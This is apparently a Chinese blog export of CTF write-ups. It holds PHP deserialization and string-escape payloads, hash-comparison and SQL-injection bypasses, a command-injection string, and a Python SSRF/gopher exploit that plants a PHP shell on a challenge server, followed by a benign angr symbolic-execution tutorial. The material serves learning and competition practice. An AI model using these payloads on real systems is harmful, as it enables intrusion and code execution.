<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;player&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;*user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;*pass&quot;</span>;s:<span class="number">154</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">;s:7:&quot;</span>*pass<span class="string">&quot;;O:7:&quot;</span>topsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>\<span class="number">00</span>*\<span class="number">00</span>n\<span class="number">61</span>me<span class="string">&quot;;O:7:&quot;</span>midsolo<span class="string">&quot;:1:&#123;S:7:&quot;</span>\<span class="number">00</span>*\<span class="number">00</span>n\<span class="number">61</span>me<span class="string">&quot;;O:6:&quot;</span>jungle<span class="string">&quot;:1:&#123;S:7:&quot;</span>\<span class="number">00</span>*\<span class="number">00</span>n\<span class="number">61</span>me<span class="string">&quot;;s:4:&quot;</span>Tyao<span class="string">&quot;;&#125;&#125;&#125;s:8:&quot;</span>*admin<span class="string">&quot;;i:1;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;\0*\0admin&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>计算多出来的数据的长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="string">&#x27;&quot;;s:7:&quot;*pass&quot;;s:158:&#x27;</span>) == <span class="number">22</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>%00*%00pass还有两个隐藏字符，下面的payload也不要忘记加上</p>
</blockquote>
<p>每次字符串逃逸可以多出2个字符，所以修改username为11个<code>\0*\0</code></p>
<p>最终exp如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">username=\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span>\<span class="number">0</span>*\<span class="number">0</span></span><br><span class="line">password=;s:<span class="number">7</span>:<span class="string">&quot;%00*%00pass&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;topsolo&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00n\61me&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;midsolo&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00n\61me&quot;</span>;O:<span class="number">6</span>:<span class="string">&quot;jungle&quot;</span>:<span class="number">1</span>:&#123;S:<span class="number">7</span>:<span class="string">&quot;\00*\00n\61me&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;&#125;&#125;&#125;;s:<span class="number">8</span>:<span class="string">&quot;*admin&quot;</span>;i:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><blockquote>
<p>哈希tricks</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>] != <span class="title function_ invoke__">hash</span>(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>] || <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash2&#x27;</span>]) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>(); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>hash4强哈希碰撞，后面是凑出or 1，直接百度就行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$int</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$md4</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$name</span>=<span class="string">&quot;0e&quot;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$md4</span>!=<span class="variable">$name</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="string">&#x27;0e&#x27;</span>.<span class="variable">$int</span>;</span><br><span class="line">    <span class="variable">$int</span>++;</span><br><span class="line">    <span class="variable">$md4</span>=<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md4&#x27;</span>,<span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>数组绕过hash比较，</p>
<p>最终exp</p>
<figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line">?hash1=<span class="number">0e251288019</span>&amp;hash2[]=<span class="number">1</span>&amp;hash3[]=<span class="number">2</span>&amp;hash4=ffifdyop</span><br></pre></td></tr></table></figure>



<h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><blockquote>
<p>命令执行</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;ip&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 3 <span class="subst">$_GET</span>[ip]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>简单命令拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=|cat%20*;</span><br></pre></td></tr></table></figure>



<h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><blockquote>
<p>php反序列化 ssrf+gopher</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ssrf.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$result</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>, <span class="variable">$sex</span>, <span class="variable">$num</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$student</span> = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$boy</span> = <span class="variable language_">$this</span>-&gt;sex;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;num;</span><br><span class="line">        <span class="variable">$student</span>-&gt;<span class="variable">$boy</span>();</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="title function_ invoke__">is_string</span>(<span class="variable">$a</span>)) || !(<span class="title function_ invoke__">is_string</span>(<span class="variable">$boy</span>)) || !(<span class="title function_ invoke__">is_object</span>(<span class="variable">$student</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$$a</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>])-&gt;<span class="title function_ invoke__">get_it</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考第五空间的《do you know》，把原来的payload改一改变量名即可</p>
<blockquote>
<p>考点：</p>
<ol>
<li>反序列化一个数组使其能够输出flag</li>
<li>$$变量覆盖</li>
<li>throw exception异常提前中断跳出ob_end_clean()</li>
<li>global处触发exception，因为global $this是非法的</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>,<span class="variable">$sex</span>,<span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;age = <span class="keyword">new</span> <span class="title class_">Pass</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;sex = <span class="string">&#x27;read&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;num = <span class="string">&#x27;result&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;age = <span class="keyword">new</span> <span class="title class_">Pass</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;sex = <span class="string">&#x27;read&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;num = <span class="string">&#x27;this&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;Tyao&quot;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">array</span>(<span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$x</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;&#125;i:1;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;&#125;i:2;s:4:%22Tyao%22;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>转到内网渗透，给到一个ssrf接口，端口在40000，点进去只有一个文件上传，没有禁gopher协议，盲猜是gopher+ssrf</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;we_have_done_ssrf_here_could_you_help_to_continue_it&#x27;</span>] ?? <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|var|apache|conf|proc|log/i&quot;</span> ,<span class="variable">$url</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">    &#123; </span><br><span class="line"></span><br><span class="line">            <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line"></span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里很多坑，文件名不能含有<code>write</code>，一度以为<code>filter</code>写不了文件，后来才发现<code>write</code>是可以省略的 : ）</p>
<p>文件内容不能含有<code>&lt;?</code>、<code>php</code>、<code>&lt;script</code>等等标签，需要<strong>同时</strong>用<code>rot13</code>和<code>base64</code>绕过（也不太懂什么base64之后也可以检测到<code>php</code>字段</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base64_encode(rot13(<span class="string">&#x27;&lt;?php echo system(&quot;cat /flag&quot;);//&#x27;</span>)) = <span class="string">&quot;PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;</span></span><br></pre></td></tr></table></figure>

<p>给出最终exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ssid = <span class="string">&quot;ttt&quot;</span></span><br><span class="line">post_string = <span class="string">&quot;file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;</span></span><br><span class="line">length = <span class="built_in">len</span>(post_string)</span><br><span class="line"></span><br><span class="line">paramsGet = &#123;<span class="string">&quot;we_have_done_ssrf_here_could_you_help_to_continue_it&quot;</span>:<span class="string">&quot;gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\</span></span><br><span class="line"><span class="string">Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\</span></span><br><span class="line"><span class="string">%s&quot;</span> % (ssid, length, post_string)&#125;</span><br><span class="line">res = rq.get(<span class="string">&quot;http://39.98.131.124/ssrf.php&quot;</span>, params=paramsGet)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"></span><br><span class="line">res2 = rq.get(<span class="string">&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/&quot;</span>)</span><br><span class="line">files = re.findall(<span class="string">&#x27;&lt;a href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>, res2.text)[<span class="number">5</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=========FILES============&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>.join(files))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;==========================&quot;</span>)</span><br><span class="line"></span><br><span class="line">res3 = rq.get(<span class="string">&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(res3.text)</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverse中Angr的利用</title>
    <url>/2021/03/19/Reverse%E4%B8%ADAngr%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>记录一下入门Reverse中符号执行的利用</p>
<span id="more"></span>

<h2 id="Angr"><a href="#Angr" class="headerlink" title="Angr"></a>Angr</h2><blockquote>
<p>官方文档：<a href="http://angr.io/api-doc/angr.html">http://angr.io/api-doc/angr.html</a></p>
</blockquote>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Angr是一个利用python开发的二进制程序分析框架，我们可以利用这个工具尝试对一些CTF题目进行符号执行来找到正确的解答，即flag。当然，要注意的是符号执行的路径选择问题到现在依旧是一个很大的问题，换句话说也就是当我们的程序存在循环时，因为符号执行会尽量遍历所有的路径，所以每次循环之后会形成至少两个分支，当循环的次数足够多时，就会造成路径爆炸，整个机器的内存会被耗尽。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>ubuntu安装教程如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">安装依赖</span></span><br><span class="line">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line"><span class="meta"># </span><span class="language-bash">在/etc/profile中加入以下代码并进行<span class="built_in">source</span></span></span><br><span class="line">export WORKON_HOME=$HOME/Python-workhome</span><br><span class="line">source /usr/share/virtualenvwrapper/virtualenvwrapper.sh</span><br><span class="line"><span class="meta"># </span><span class="language-bash">安装angr</span></span><br><span class="line">mkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr</span><br><span class="line"><span class="meta"># </span><span class="language-bash">运行angr</span></span><br><span class="line">workon angr</span><br></pre></td></tr></table></figure>

<h3 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h3><p><strong>基础实例</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = angr.Project(<span class="string">&quot;r100&quot;</span>, auto_load_libs=<span class="literal">True</span>)</span><br><span class="line">    simgr = p.factory.simulation_manager(p.factory.full_init_state())</span><br><span class="line">    simgr.explore(find=<span class="number">0x400844</span>, avoid=<span class="number">0x400855</span>)</span><br><span class="line">    <span class="keyword">return</span> simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>).strip(<span class="string">b&#x27;\0\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(main())</span><br></pre></td></tr></table></figure>

<p><strong>加载依赖库</strong></p>
<p>auto_load_libs用来设置是否自动载入依赖的库，如果设置为True会自动载入依赖的库，然后分析到库函数调用时也会进入库函数，这样会增加分析的工作量。如果为False，程序调用函数时，会直接返回一个不受约束的符号值</p>
<p><strong>设置SimState</strong></p>
<p>SimState表示程序的状态，包括它的内存、寄存器等等</p>
<p>SimState对象通常有三种：</p>
<ol>
<li><code>blank_state(**kwargs)</code><br>返回一个未初始化的state，此时需要主动设置入口地址，以及自己想要设置的参数</li>
<li><code>entry_state(**kwargs)</code><br>返回程序入口地址的state，通常来说都会使用该状态</li>
<li><code>full_init_state(**kwargs)</code><br>和<code>entry_state(**kwargs)</code>类似，但是调用在执行到达入口点之前应该调用每个初始化函数</li>
</ol>
<p>我们可以通过 <code>state.regs</code> 和 <code>state.mem</code> 访问寄存器和内存信息。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">state.regs.rip</span><br><span class="line">state.regs.rax</span><br><span class="line">state.mem[proj.entry].<span class="built_in">int</span>.resolved</span><br></pre></td></tr></table></figure>

<p><strong>创建Simulation Managers</strong></p>
<p>p.factory.simulation_manager创建一个simulation_manager进行模拟执行，其中传入一个SimState</p>
<p>SimulationManager一共有三种运行方式：</p>
<ol>
<li><code>step()</code><br>每次向前运行一个基本块，并返回进行分类</li>
<li><code>run()</code><br>运行完所有的基本块，然后会出现deadended的状态，此时我们通常访问最后一个状态来获取我们所需要的信息</li>
<li><code>explore()</code><br>根据find和avoid进行基本块的执行，最后会返回found和avoid状态</li>
</ol>
<p><strong>获取执行结果</strong></p>
<p>simgr.found存储了所有符合条件的分支</p>
<p><strong>help命令</strong></p>
<p>可以使用help命令查看某个函数的详细说明，比如<code>help(state)</code></p>
<p><strong>clarioy</strong></p>
<blockquote>
<p>官方文档：<a href="http://angr.io/api-doc/claripy.html">http://angr.io/api-doc/claripy.html</a></p>
</blockquote>
<p>claripy是一个符号求解引擎，和z3类似，通常用来构造输入，单位为bit</p>
<p>使用<code>claripy.BVS()</code>创建位向量符号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">claripy.BVS(<span class="string">&quot;u&quot;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>使用<code>claripy.BVV()</code>创建位向量值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">claripy.BVV(<span class="number">0xab</span>, <span class="number">0x2</span> * <span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>这个<a href="https://github.com/jakespringer/angr_ctf">地址</a>是官方关于在CTF利用Angr的详细教程</p>
<p>这个<a href="https://docs.angr.io/examples">地址</a>是官方给出的在CTF比赛中使用Angr的例子，都是些精髓</p>
<p>此外还有@<a href="https://xz.aliyun.com/u/11261">Badrer</a>师傅在先知也写了很多相关的文章，大家可以学习一下</p>
<p>下面是一些我碰到的一些CTF例子，会不断地进行更新</p>
<h2 id="funnyre"><a href="#funnyre" class="headerlink" title="funnyre"></a>funnyre</h2><blockquote>
<p>题目源于【WUSTCTF2020】</p>
</blockquote>
<h3 id="去花指令"><a href="#去花指令" class="headerlink" title="去花指令"></a>去花指令</h3><p>直接用IDA打开，尝试反编译main函数发现有花指令，根据上下文逻辑nop掉图中红框部分，一共有4处</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103192317bf81ee1b2abcab097522.png" alt="image-20210319172652670" style="zoom:80%;" />



<p>把data强制分析为code，再把修改过的code声明为function，之后就可以正常的反汇编了</p>
<p>main()函数中确定了flag的长度和格式，还有一长串的异或运算</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021031923179e8ec2c34d6a38fed435.png" alt="image-20210319211423984" style="zoom: 80%;" />

<p>最后与unk_4025C0的数据进行比对</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103192317b68e2a8d0e4880427510.png" alt="image-20210319211739539" style="zoom:80%;" />

<h3 id="符号执行-1"><a href="#符号执行-1" class="headerlink" title="符号执行"></a>符号执行</h3><p>到这里就可以有三种解决方法，第一种是直接爆破，时间会很长；第二种是把所有代码逆回去，会很麻烦；第三种，也是最简单的一种，就是使用Angr来进行符号执行约束求解</p>
<p>下面给出符号执行的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建project</span></span><br><span class="line">p = angr.Project(<span class="string">&quot;./attachment&quot;</span>, load_options=&#123;<span class="string">&quot;auto_load_libs&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"><span class="comment"># 设置程序入口,此处必须是flag加载完的位置</span></span><br><span class="line">state = p.factory.entry_state(addr=<span class="number">0x400601</span>)</span><br><span class="line"><span class="comment"># 创建符号向量</span></span><br><span class="line">flag = claripy.BVS(<span class="string">&quot;flag&quot;</span>, <span class="number">8</span>*<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 按照程序逻辑flag存放在rdx的第6位,因为前5位是&#x27;flag&#123;&#x27;</span></span><br><span class="line">state.memory.store(state.regs.rdx + <span class="number">5</span>, flag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># 也可以自己手动修改rdx的位置，但是相对位置不变就行</span></span><br><span class="line"><span class="string">state.memory.store(0x603056+0x300 + 5, flag)</span></span><br><span class="line"><span class="string">state.regs.rdx = 0x603056+0x300</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 创建Simulation Manager</span></span><br><span class="line">sm = p.factory.simulation_manager(state)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] init ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置探索成功的地址</span></span><br><span class="line">sm.explore(find=<span class="number">0x401DAE</span>)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] found!&quot;</span>)</span><br><span class="line">    <span class="comment">#输出flag结果</span></span><br><span class="line">    x = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">bytes</span>).strip(<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>



<h2 id="very-success"><a href="#very-success" class="headerlink" title="very_success"></a>very_success</h2><blockquote>
<p>题目来源于【flareon2015_2】</p>
</blockquote>
<h3 id="符号执行-2"><a href="#符号执行-2" class="headerlink" title="符号执行"></a>符号执行</h3><p>程序主要代码如下，把用户输入存储到<code>byte_402159</code>中，其中用户输入为37位，<code>sub_401084()</code>对用户输入进行加密，最后与系统的<code>a1</code>比较，相同则成功，其中<code>a1</code>可以通过动态调试得到</p>
<p>所以我们可以把符号执行的初始地址地位在<code>sub_401084()</code>的开始</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210322015898685f1ba3e262015856.png" alt="image-20210322002451961"></p>
<p>选取好了初始地址之后，我们需要给参数进行赋值，这里涉及到对内存进行操控</p>
<p>第1个参数来源于<code>0x401064</code>，即函数的返回地址</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103220158b532dd716df687936055.png" alt="image-20210322013920422"></p>
<p>第2个参数来源于<code>0x4010e4</code>，得追溯到父函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210322015864c952b7f622010e130d.png" alt="image-20210322012614011"></p>
<p>第3个参数来源于<code>0x402159</code>，直接是一个静态地址</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202103220158d6b80952cb87c09ebd2b.png" alt="image-20210322001900137"></p>
<p>第4个参数就是输入字符串的长度，直接赋一个大于等于37的数值即可</p>
<p>所以最终脚本如下</p>
